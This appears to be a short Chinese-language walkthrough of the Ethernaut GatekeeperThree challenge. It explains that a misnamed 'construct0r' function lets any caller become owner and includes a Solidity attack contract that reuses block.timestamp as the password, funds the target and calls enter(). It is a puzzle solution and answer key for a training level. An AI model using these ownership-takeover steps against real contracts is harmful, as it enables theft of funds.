# GateKeeperThree

## Reference
[GateKeeperThree](https://ethernaut.openzeppelin.com/level/28)

[GateKeeperThree.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/28-GatekeeperThree/GatekeeperThree.sol)

[Ethereum-Creation-Code](https://www.rareskills.io/post/ethereum-contract-creation-code)

## 目标
成为 entrant 地址

## 分析
只是一个错误函数名称引起的错误,任何地址都可以成为owner
```solidity
    function construct0r() public {
        owner = msg.sender;
    }
```
## attack 合约
```solidity
contract AttackPassward {
    uint256 public password;

    SimpleTrick public trick;
    GatekeeperThree public gthree;

    constructor(SimpleTrick _trick, GatekeeperThree _gthree) payable {
        trick = _trick;
        gthree = _gthree;
    }

    function attackPassword() public {
        password = block.timestamp;
        trick.checkPassword(password);
        gthree.construct0r();
        gthree.getAllowance(password);
        address(gthree).call{value: 0.0011 ether}("");
        gthree.enter();
    }

    // receive() external payable {}
}
```
